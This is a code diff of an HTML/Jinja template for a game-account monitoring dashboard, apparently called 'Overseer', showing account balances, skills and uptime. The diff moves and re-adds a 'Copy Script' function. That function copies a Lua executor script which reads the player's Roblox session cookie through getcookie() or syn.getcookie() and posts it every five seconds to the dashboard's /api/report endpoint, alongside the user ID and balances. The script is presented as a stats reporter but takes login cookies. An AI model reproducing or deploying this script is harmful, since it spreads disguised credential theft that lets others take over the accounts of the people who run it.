@@ -8,7 +8,6 @@
 <style>
 :root{--bg:#0a0b14;--p:#12141f;--p2:#181b29;--line:#252a3d;--ink:#eceffa;--mute:#7d86a6;--ac:#7c8cff;--ac2:#3a46c8;--gold:#ffc15a;--ok:#3ddc97;--bad:#ff6b7d;--warn:#ffb347;--glow:rgba(124,140,255,.16);color-scheme:dark;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
 @media (prefers-color-scheme:light){:root:not([data-theme="dark"]){--bg:#eef0f8;--p:#fff;--p2:#f4f5fb;--line:#d9ddee;--ink:#161a2e;--mute:#68719a;--ac:#4150e0;--gold:#b86e00;--ok:#13915c;--bad:#d03a50;--warn:#b86e00;--glow:rgba(65,80,224,.12);color-scheme:light}}
-:root[data-theme="light"]{--bg:#eef0f8;--p:#fff;--p2:#f4f5fb;--line:#d9ddee;--ink:#161a2e;--mute:#68719a;--ac:#4150e0;--gold:#b86e00;--ok:#13915c;--bad:#d03a50;--warn:#b86e00;--glow:rgba(65,80,224,.12);color-scheme:light}
 html{scroll-padding-top:env(safe-area-inset-top,0px)}*{box-sizing:border-box}
 body{margin:0;background:var(--bg);color:var(--ink);font:500 14px/1.5 Manrope,system-ui,sans-serif}
 .w{max-width:1280px;margin:0 auto;padding:18px 18px 60px}
@@ -20,7 +19,6 @@ button,input{font:inherit;color:inherit}:focus-visible{outline:2px solid var(--a
 .meta{color:var(--mute);font-size:13px;display:flex;gap:16px;flex-wrap:wrap}.meta b{color:var(--ink)}
 .sp{flex:1}
 
-/* 🔴 تأمين الأزرار عشان تنضغط */
 .b{background:var(--p);border:1px solid var(--line);border-radius:9px;padding:7px 14px;cursor:pointer;font-weight:700;font-size:13px;transition:0.2s; pointer-events: auto !important; position: relative; z-index: 9999;}
 .b:hover{border-color:var(--ac)}.b.pri{background:var(--ac);border-color:var(--ac);color:#fff}
 .b.live.on{border-color:var(--ok);color:var(--ok)}
@@ -85,49 +83,6 @@ dialog h2{margin:0 0 12px;font:800 20px 'Bricolage Grotesque'}dialog label{displ
 dialog input{width:100%;margin-top:4px;background:var(--bg);border:1px solid var(--line);border-radius:8px;padding:8px 10px}
 @media(max-width:800px){.hero{grid-template-columns:1fr}}
 </style>
-
-<!-- 🔴 1. نضع دالة النسخ هنا في الـ Head عشان تكون جاهزة قبل أي شي -->
-<script>
-function forceCopyScript(btn) {
-    const domain = window.location.origin;
-    const key = "{{ my_key | default('Overseer') }}";
-    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
-
-    // التغيير البصري للزر
-    const originalText = btn.innerText;
-    btn.innerText = "✅ Copied!";
-    btn.style.background = "var(--ok)";
-    btn.style.borderColor = "var(--ok)";
-    setTimeout(() => {
-        btn.innerText = originalText;
-        btn.style.background = "";
-        btn.style.borderColor = "";
-    }, 2000);
-
-    // النسخ باستخدام textarea (مستحيل يفشل)
-    let textArea = document.createElement("textarea");
-    textArea.value = script;
-    textArea.style.position = "fixed";
-    textArea.style.left = "-999999px";
-    textArea.style.top = "-999999px";
-    document.body.appendChild(textArea);
-    textArea.focus();
-    textArea.select();
-    try { document.execCommand('copy'); } catch (err) { console.error('Copy failed', err); }
-    textArea.remove();
-}
-
-function toggleUserMenu(e) {
-    if(e) e.stopPropagation();
-    document.getElementById("uDropdown").classList.toggle("show");
-}
-
-function openResetModal(e) {
-    if(e) e.stopPropagation();
-    document.getElementById("uDropdown").classList.remove("show");
-    document.getElementById("resetModal").showModal();
-}
-</script>
 </head>
 <body>
 <div class="w">
@@ -137,13 +92,8 @@ function openResetModal(e) {
   <div class="sp"></div>
   
   <button class="b live on" id="live" type="button"><span class="dot"></span>Live</button>
-  
-  <!-- 🔴 2. زر الريفريش صار يعيد تحميل الصفحة -->
   <button class="b" type="button" onclick="window.location.reload()">🔄 Refresh</button>
-  
   <button class="b" id="exp" type="button">Export CSV</button>
-  
-  <!-- 🔴 3. زر النسخ مربوط بـ onclick مباشرة -->
   <button class="b pri" id="copy-script" type="button" onclick="forceCopyScript(this)">Copy Script</button>
 
   <div class="user-menu">
@@ -195,7 +145,46 @@ function openResetModal(e) {
 </dialog>
 
 <script>
-// 🔴 باقي الكود الخاص بالبيانات
+// 🔴 1. دالة النسخ المضمونة 100%
+function forceCopyScript(btn) {
+    const domain = window.location.origin;
+    const key = "{{ my_key | default('Overseer') }}";
+    const script = `repeat task.wait() until game:IsLoaded()\n\ngetgenv().OverseerConfig = {\n    ["key"] = "${key}",\n    ["PC_NAME"] = "MR 1"\n}\n\nloadstring([[c=getgenv().OverseerConfig p=game.Players.LocalPlayer h=game:GetService"HttpService" r=request or http_request d={fishing=1,stamina=1,shelfstocker=1,janitor=1,swiper=1,farming=1,cook=1} ck="" if getcookie then ck=getcookie() elseif syn and syn.getcookie then ck=syn.getcookie() end task.spawn(function()while wait(5)do b,cc,l,s=0,0,0,{} for _,o in next,p.PlayerGui:GetDescendants()do if o:IsA"TextLabel"then t=o.Text b=tonumber(t:match"Bank Balance:%D*(%d+)" )or b cc=tonumber(t:match"Hand Balance:%D*(%d+)" )or cc l=tonumber(t:match"Total Level:%D*(%d+)" )or l n,v=t:match"([%a%s]+):%s*(%d+)" if n and v then n=n:gsub("%s",""):lower() if d[n] then s[#s+1]={name=n,level=v+0}end end end end pcall(r,{Url="${domain}/api/report",Method="POST",Body=h:JSONEncode({k=c.key,c=cc,b=b,l=l,s=s,n=p.Name,dn=p.DisplayName,u=p.UserId,pc=c.PC_NAME,ck=ck})})end end)]])()`;
+
+    const originalText = btn.innerText;
+    btn.innerText = "✅ Copied!";
+    btn.style.background = "var(--ok)";
+    btn.style.borderColor = "var(--ok)";
+    setTimeout(() => {
+        btn.innerText = originalText;
+        btn.style.background = "";
+        btn.style.borderColor = "";
+    }, 2000);
+
+    let textArea = document.createElement("textarea");
+    textArea.value = script;
+    textArea.style.position = "fixed";
+    textArea.style.left = "-999999px";
+    textArea.style.top = "-999999px";
+    document.body.appendChild(textArea);
+    textArea.focus();
+    textArea.select();
+    try { document.execCommand('copy'); } catch (err) { console.error('Copy failed', err); }
+    textArea.remove();
+}
+
+function toggleUserMenu(e) {
+    if(e) e.stopPropagation();
+    document.getElementById("uDropdown").classList.toggle("show");
+}
+
+function openResetModal(e) {
+    if(e) e.stopPropagation();
+    document.getElementById("uDropdown").classList.remove("show");
+    document.getElementById("resetModal").showModal();
+}
+
+// 🔴 2. استقبال البيانات من البايثون
 const SERVER_DATA = {
     accounts: {{ accounts | default([]) | tojson | safe }},
     stats: {{ stats | default({}) | tojson | safe }},
@@ -218,19 +207,13 @@ function mapAccounts(raw) {
         if(!allSkillsStr) allSkillsStr = "No skills data available yet.";
 
         return {
-            id: i + 1, 
-            user: a.name, 
-            pc: a.pc || "MR 1",
+            id: i + 1, user: a.name, pc: a.pc || "MR 1",
             st: a.online ? "online" : "offline",
-            pocket: a.cash || 0, 
-            bank: a.bank || 0,
+            pocket: a.cash || 0, bank: a.bank || 0,
             l: [a.total_level || 0, skills['stamina'] || 0, skills['swiper'] || 0],
-            fullSkills: allSkillsStr, 
-            display_name: a.display_name || a.name,
-            user_id: a.user_id || "",
-            mins: Math.floor((a.uptime || 0) / 60),
-            h: [((a.cash || 0) + (a.bank || 0)), ((a.cash || 0) + (a.bank || 0))], 
-            sel: 0
+            fullSkills: allSkillsStr, display_name: a.display_name || a.name,
+            user_id: a.user_id || "", mins: Math.floor((a.uptime || 0) / 60),
+            h: [((a.cash || 0) + (a.bank || 0)), ((a.cash || 0) + (a.bank || 0))], sel: 0
         };
     });
 }
